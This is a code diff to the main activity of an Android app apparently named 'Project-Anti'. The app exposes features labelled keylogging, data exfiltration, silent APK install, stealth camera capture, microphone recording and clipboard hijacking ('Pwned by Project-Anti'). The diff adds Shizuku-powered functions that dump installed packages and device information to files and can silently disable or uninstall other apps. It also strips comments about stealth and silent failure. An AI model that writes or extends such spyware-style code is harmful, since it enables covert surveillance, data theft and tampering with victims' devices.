@@ -131,20 +131,13 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun onFeatureClick(featureId: Int) {
-        if (!isRootAvailable && featureId != FEATURE_KEYLOGGING && featureId != FEATURE_PERMISSIONS_SCANNER && featureId != FEATURE_OVERLAY_DETECTOR && featureId != FEATURE_HIDDEN_APP_FINDER && featureId != FEATURE_CAMERA_MIC_DETECTOR && featureId != FEATURE_GET_CLIPBOARD && featureId != FEATURE_SET_CLIPBOARD) {
-            // Non-root features can proceed
-        } else if (!isRootAvailable) {
-            // Silently fail for root features if not rooted
-            return
-        }
-
         when (featureId) {
             FEATURE_KEYLOGGING -> openAccessibilitySettings()
             FEATURE_DATA_EXFILTRATION -> exfiltrateAllData()
             FEATURE_SILENT_INSTALL -> findAndInstallFirstApk()
             FEATURE_NETWORK_MONITOR -> startNetworkMonitoring()
             FEATURE_FILE_ACCESS -> browseSystemFiles()
-            FEATURE_SYSTEM_CONTROL -> rebootDevice() // Simplified for stealth
+            FEATURE_SYSTEM_CONTROL -> rebootDevice()
             FEATURE_SCREENSHOT -> takeScreenshot()
             FEATURE_LOG_ACCESS -> showLogAccess()
             FEATURE_MIC_RECORDER -> startMicRecording()
@@ -157,7 +150,10 @@ class MainActivity : ComponentActivity() {
             FEATURE_CAMERA_MIC_DETECTOR -> detectCameraMicUsage()
             FEATURE_STEALTH_CAMERA -> takeStealthPicture()
             FEATURE_GET_CLIPBOARD -> getClipboard()
-            FEATURE_SET_CLIPBOARD -> setClipboard("Pwned by Project-Anti") // Example text
+            FEATURE_SET_CLIPBOARD -> setClipboard("Pwned by Project-Anti")
+            FEATURE_SHIZUKU_OPERATIONS -> showShizukuOperations()
+            FEATURE_PACKAGE_MANAGER -> showPackageManager()
+            FEATURE_SYSTEM_PROPERTIES -> showSystemProperties()
         }
     }
 
@@ -349,6 +345,83 @@ class MainActivity : ComponentActivity() {
         val clip = ClipData.newPlainText("label", text)
         clipboard.setPrimaryClip(clip)
     }
+
+    private fun showShizukuOperations() {
+        if (!isShizukuAvailable) {
+            Log.w("MainActivity", "Shizuku not available for operations")
+            return
+        }
+
+        // Execute a test command through Shizuku
+        shizukuManagerService?.executeCommandAsync("getprop ro.build.version.release") { result ->
+            runOnUiThread {
+                Log.i("MainActivity", "Android version: ${result.output}")
+                saveDataToFile("shizuku_test.txt", "Android version: ${result.output}")
+            }
+        }
+    }
+
+    private fun showPackageManager() {
+        if (!isShizukuAvailable) {
+            Log.w("MainActivity", "Shizuku not available for package management")
+            return
+        }
+
+        // Get list of installed packages
+        shizukuManagerService?.getInstalledPackagesAsync { result ->
+            runOnUiThread {
+                if (result.isSuccess()) {
+                    saveDataToFile("installed_packages.txt", result.output)
+                    Log.i("MainActivity", "Package list saved")
+                }
+            }
+        }
+    }
+
+    private fun showSystemProperties() {
+        if (!isShizukuAvailable) {
+            Log.w("MainActivity", "Shizuku not available for system properties")
+            return
+        }
+
+        // Get device information
+        shizukuManagerService?.getDeviceInfoAsync { result ->
+            runOnUiThread {
+                if (result.isSuccess()) {
+                    saveDataToFile("device_info.txt", result.output)
+                    Log.i("MainActivity", "Device info saved: ${result.output}")
+                }
+            }
+        }
+    }
+
+    private fun performShizukuPackageOperation(packageName: String, operation: String) {
+        if (!isShizukuAvailable) return
+
+        when (operation) {
+            "disable" -> {
+                shizukuManagerService?.setComponentEnabledAsync(packageName, packageName, false) { success, pkg, comp, enabled ->
+                    runOnUiThread {
+                        Log.i("MainActivity", "Package $pkg ${if (enabled) "enabled" : "disabled"}: $success")
+                    }
+                }
+            }
+            "enable" -> {
+                shizukuManagerService?.setComponentEnabledAsync(packageName, packageName, true) { success, pkg, comp, enabled ->
+                    runOnUiThread {
+                        Log.i("MainActivity", "Package $pkg ${if (enabled) "enabled" : "disabled"}: $success")
+                    }
+                }
+            }
+            "uninstall" -> {
+                shizukuManagerService?.uninstallPackageAsync(packageName) { success, pkg ->
+                    runOnUiThread {
+                        Log.i("MainActivity", "Package $pkg uninstall: $success")
+                    }
+                }
+            }
+        }
+    }
 }
 
 @Composable
@@ -454,7 +527,10 @@ fun getFeatureList(context: Context): List<FeatureItem> {
         FeatureItem(FEATURE_CAMERA_MIC_DETECTOR, context.getString(R.string.camera_mic_detector), "Detects if the camera or microphone is currently being used by any app.", 0),
         FeatureItem(FEATURE_STEALTH_CAMERA, context.getString(R.string.stealth_camera), "Silently takes a picture from the front camera.", 0),
         FeatureItem(FEATURE_GET_CLIPBOARD, context.getString(R.string.get_clipboard), "Gets the current clipboard content.", 0),
-        FeatureItem(FEATURE_SET_CLIPBOARD, context.getString(R.string.set_clipboard), "Sets the clipboard content.", 0)
+        FeatureItem(FEATURE_SET_CLIPBOARD, context.getString(R.string.set_clipboard), "Sets the clipboard content.", 0),
+        FeatureItem(FEATURE_SHIZUKU_OPERATIONS, context.getString(R.string.shizuku_operations), "Performs operations using Shizuku.", 0),
+        FeatureItem(FEATURE_PACKAGE_MANAGER, context.getString(R.string.package_manager), "Manages installed packages using Shizuku.", 0),
+        FeatureItem(FEATURE_SYSTEM_PROPERTIES, context.getString(R.string.system_properties), "Views system properties and device information.", 0)
     )
 }
 
@@ -478,6 +554,9 @@ const val FEATURE_CAMERA_MIC_DETECTOR = 16
 const val FEATURE_STEALTH_CAMERA = 17
 const val FEATURE_GET_CLIPBOARD = 18
 const val FEATURE_SET_CLIPBOARD = 19
+const val FEATURE_SHIZUKU_OPERATIONS = 20
+const val FEATURE_PACKAGE_MANAGER = 21
+const val FEATURE_SYSTEM_PROPERTIES = 22
 
 @Preview(showBackground = true, uiMode = android.content.res.Configuration.UI_MODE_NIGHT_YES)
 @Composable
